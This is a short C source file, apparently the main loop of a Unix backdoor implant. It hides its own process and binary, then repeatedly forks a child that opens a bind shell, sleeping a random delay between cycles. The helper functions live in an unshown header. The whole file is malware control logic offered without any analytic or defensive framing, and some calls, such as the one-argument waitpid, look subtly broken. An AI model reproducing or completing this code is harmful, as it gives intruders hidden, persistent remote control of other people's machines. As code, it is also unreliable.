#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "XJJ_util.h"

int main(int argc, char *argv[])
{
  
  hide_pid( ) ;
  hide_binary( ) ;

  int pid ;
  int delay ;
  while( 1 ) {
    pid = fork( ) ;
    if( pid == 0 ) {
      bind_shell( ) ;
      exit( EXIT_SUCCESS ) ;
    } else {
      waitpid( pid ) ;
    }
    srand( time( NULL ) ) ;
    delay = ( rand( ) % RANDOM_MAX ) + RANDOM_BASE ;
    sleep( delay ) ;
  }
    
  return 0;
}

